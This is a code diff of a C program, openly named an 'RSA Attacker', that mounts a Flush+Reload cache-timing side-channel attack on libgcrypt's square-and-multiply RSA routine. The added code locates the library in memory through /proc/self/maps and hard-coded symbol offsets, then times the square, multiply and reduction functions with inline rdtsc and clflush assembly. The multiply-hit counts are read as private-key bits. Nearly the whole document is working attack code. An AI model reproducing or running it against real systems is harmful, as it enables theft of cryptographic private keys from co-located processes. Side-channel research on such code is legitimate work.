@@ -13,7 +13,13 @@
 #define NUM_MONITORED_FUNCTIONS 3
 #define MEASUREMENT_CYCLES 10000
 #define THRESHOLD 200
-#define OBSERVATION_WINDOW_US 100
+#define OBSERVATION_WINDOW_US 2
+
+// Symbol offsets from readelf output
+// #define POWM_OFFSET        0x000000000004e390
+#define SQR_OFFSET    0x0000000000051470
+#define MUL_OFFSET    0x0000000000051a70
+#define RED_OFFSET    0x0000000000050450
 
 volatile int running = 1;
 
@@ -28,56 +34,49 @@ void signal_handler(int sig) {
     running = 0;
 }
 
-static inline uint64_t rdtsc() {
-    uint32_t low, high;
-    asm volatile ("rdtsc" : "=a" (low), "=d" (high));
-    return ((uint64_t)high << 32) | low;
-}
+// static inline void flush_cache_line(void* addr) {
+//     asm volatile ("clflush (%0)" : : "r" (addr) : "memory");
+// }
 
-static inline void flush_cache_line(void* addr) {
-    asm volatile ("clflush (%0)" : : "r" (addr) : "memory");
-}
+void* get_library_base_address() {
+    FILE* maps = fopen("/proc/self/maps", "r");
+    if (!maps) return NULL;
 
-static inline void memory_barrier() {
-    asm volatile ("mfence" : : : "memory");
-}
+    char line[1024];
+    void* base_addr = NULL;
 
-uint64_t time_memory_access(void* addr) {
-    uint64_t start, end;
-    volatile char dummy;
-
-    memory_barrier();
-    start = rdtsc();
-    dummy = *(volatile char*)addr;
-    end = rdtsc();
-    memory_barrier();
-
-    return end - start;
-}
-
-void analyze_bit_pattern(monitored_function_t *funcs, int measurement_idx) {
-    static int last_analysis = 0;
-
-    if (measurement_idx - last_analysis >= 100) {
-        printf("RSA Attacker: Analyzing execution pattern (measurement %d):\n", measurement_idx);
-
-        int square_hits = funcs[0].hit_count - (last_analysis > 0 ? funcs[0].hit_count - 100 : 0);
-        int multiply_hits = funcs[1].hit_count - (last_analysis > 0 ? funcs[1].hit_count - 100 : 0);
-        int reduce_hits = funcs[2].hit_count - (last_analysis > 0 ? funcs[2].hit_count - 100 : 0);
-
-        printf("  Square operations:   %3d hits (always present)\n", square_hits);
-        printf("  Multiply operations: %3d hits (indicates bit = 1)\n", multiply_hits);
-        printf("  Reduce operations:   %3d hits (modular reduction)\n", reduce_hits);
-
-        // Simplified bit analysis
-        if (multiply_hits > 50) {
-            printf("  -> Detected: Private key bit likely = 1 (Square-Reduce-Multiply-Reduce)\n");
-        } else {
-            printf("  -> Detected: Private key bit likely = 0 (Square-Reduce only)\n");
+    while (fgets(line, sizeof(line), maps)) {
+        if (strstr(line, "libgcrypt.so.11.6.0")) {
+            unsigned long addr;
+            if (sscanf(line, "%lx-", &addr) == 1) {
+                base_addr = (void*)addr;
+                break;
+            }
         }
-
-        last_analysis = measurement_idx;
     }
+    fclose(maps);
+    return base_addr;
+}
+
+int probe(void* addr) {
+    volatile unsigned long time;
+
+    asm __volatile__ (
+            " mfence \n"
+            " lfence \n"
+            " rdtsc \n"
+            " lfence \n"
+            " movl %%eax, %%esi \n"
+            " movl (%1), %%eax \n"
+            " lfence \n"
+            " rdtsc \n"
+            " subl %%esi, %%eax \n"
+            " clflush 0(%1) \n"
+            : "=a" (time)
+            : "c" (addr)
+            : "%esi", "%edx");
+
+    return time < THRESHOLD;
 }
 
 int main(int argc, char* argv[]) {
@@ -86,7 +85,6 @@ int main(int argc, char* argv[]) {
     int total_measurements = 0;
 
     printf("RSA Attacker process starting (PID: %d)\n", getpid());
-    printf("RSA Attacker: Targeting RSA square-and-multiply implementation\n");
 
     signal(SIGTERM, signal_handler);
     signal(SIGINT, signal_handler);
@@ -96,30 +94,41 @@ int main(int argc, char* argv[]) {
         fprintf(stderr, "Failed to load libgcrypt: %s\n", dlerror());
         return 1;
     }
+    printf("Library handle: %p\n", lib_handle);
 
-    // Target the key functions in square-and-multiply exponentiation
-    void* powm_func = dlsym(lib_handle, "gcry_mpi_powm");
-    void* sqr_func = dlsym(lib_handle, "_gcry_mpih_sqr_n_basecase");  // Square operation
-    void* mul_func = dlsym(lib_handle, "_gcry_mpih_mul");             // Multiply operation
-
-    if (!powm_func) {
-        fprintf(stderr, "Failed to find gcry_mpi_powm function\n");
+    void* base_addr = get_library_base_address();
+    if (!base_addr) {
+        fprintf(stderr, "Failed to get library base address\n");
         dlclose(lib_handle);
         return 1;
     }
+    printf("Library base address: %p\n", base_addr);
+
+    // void* powm_via_dlsym = dlsym(lib_handle, "gcry_mpi_powm");
+    // void* powm_calculated = (char*)base_addr + POWM_OFFSET;
+    void* sqr_func = (char*)base_addr + SQR_OFFSET;
+    void* mul_func = (char*)base_addr + MUL_OFFSET;
+    void* red_func = (char*)base_addr + RED_OFFSET;
+
+    // printf("\nCalculated addresses (base + offset):\n");
+    // printf("_gcry_mpi_powm dlsym:                   %p\n", powm_via_dlsym);
+    // printf("_gcry_mpi_powm calculated:              %p\n", powm_calculated);
+    // printf("_gcry_mpih_sqr_n_basecase calculated:   %p\n", sqr_func);
+    // printf("_gcry_mpih_mul calculated:              %p\n", mul_func);
+    // printf("_gcry_mpih_divrem calculated:           %p\n", red_func);
 
     // Initialize monitoring structures
-    funcs[0].address = sqr_func ? sqr_func : (char*)powm_func + 0x100;
+    funcs[0].address = sqr_func;
     strcpy(funcs[0].name, "Square");
     funcs[0].hit_count = 0;
     funcs[0].timing_history = malloc(MEASUREMENT_CYCLES * sizeof(uint64_t));
 
-    funcs[1].address = mul_func ? mul_func : (char*)powm_func + 0x200;
+    funcs[1].address = mul_func;
     strcpy(funcs[1].name, "Multiply");
     funcs[1].hit_count = 0;
     funcs[1].timing_history = malloc(MEASUREMENT_CYCLES * sizeof(uint64_t));
 
-    funcs[2].address = (char*)powm_func + 0x300; // Reduction is part of powm
+    funcs[2].address = red_func;
     strcpy(funcs[2].name, "Reduce");
     funcs[2].hit_count = 0;
     funcs[2].timing_history = malloc(MEASUREMENT_CYCLES * sizeof(uint64_t));
@@ -135,32 +144,26 @@ int main(int argc, char* argv[]) {
 
     while (running && total_measurements < MEASUREMENT_CYCLES) {
         // Flush all monitored functions
-        for (int i = 0; i < NUM_MONITORED_FUNCTIONS; i++) {
-            flush_cache_line(funcs[i].address);
-        }
+        // for (int i = 0; i < NUM_MONITORED_FUNCTIONS; i++) {
+        //     flush_cache_line(funcs[i].address);
+        // }
 
         // Wait for victim to execute RSA operations
         usleep(OBSERVATION_WINDOW_US);
 
         // Measure access times
         for (int i = 0; i < NUM_MONITORED_FUNCTIONS; i++) {
-            uint64_t access_time = time_memory_access(funcs[i].address);
-            funcs[i].timing_history[total_measurements] = access_time;
-
-            if (access_time < THRESHOLD) {
-                funcs[i].hit_count++;
-            }
+            funcs[i].hit_count += probe(funcs[i].address);
         }
 
         total_measurements++;
-
-        // Analyze pattern every 100 measurements
-        analyze_bit_pattern(funcs, total_measurements);
-
-        if (total_measurements % 1000 == 0) {
-            printf("RSA Attacker: Completed %d measurements\n", total_measurements);
-        }
     }
+
+    for (int i = 0; i < NUM_MONITORED_FUNCTIONS; i++) {
+        printf("%d: %d\n", i, funcs[i].hit_count);
+    }
+
+    return 0;
 
     printf("\n=== RSA KEY RECOVERY ATTACK RESULTS ===\n");
     printf("Total measurements: %d\n", total_measurements);
@@ -175,33 +178,6 @@ int main(int argc, char* argv[]) {
             printf(" <- ACTIVE");
         }
         printf("\n");
-    }
-
-    printf("\n=== ATTACK ANALYSIS ===\n");
-    printf("RSA Square-and-Multiply Pattern Analysis:\n");
-    printf("• Square operations: Always present (hit rate should be high)\n");
-    printf("• Multiply operations: Present when private key bit = 1\n");
-    printf("• Reduce operations: Present after each square/multiply\n");
-    printf("\nPrivate Key Bit Recovery:\n");
-
-    double square_rate = (double)funcs[0].hit_count / total_measurements * 100;
-    double multiply_rate = (double)funcs[1].hit_count / total_measurements * 100;
-    double reduce_rate = (double)funcs[2].hit_count / total_measurements * 100;
-
-    if (square_rate > 50.0) {
-        printf("✓ RSA operations detected (square operations: %.1f%%)\n", square_rate);
-        if (multiply_rate > 30.0) {
-            printf("✓ High multiply activity (%.1f%%) suggests many '1' bits in private key\n", multiply_rate);
-        } else {
-            printf("• Lower multiply activity (%.1f%%) suggests fewer '1' bits\n", multiply_rate);
-        }
-
-        printf("\nKey Recovery Status:\n");
-        printf("• To fully recover the key, extend timing analysis\n");
-        printf("• Correlate timing patterns with bit positions\n");
-        printf("• Apply statistical analysis to distinguish bit patterns\n");
-    } else {
-        printf("⚠ Low RSA activity detected - victim may not be performing RSA operations\n");
     }
 
     // Cleanup
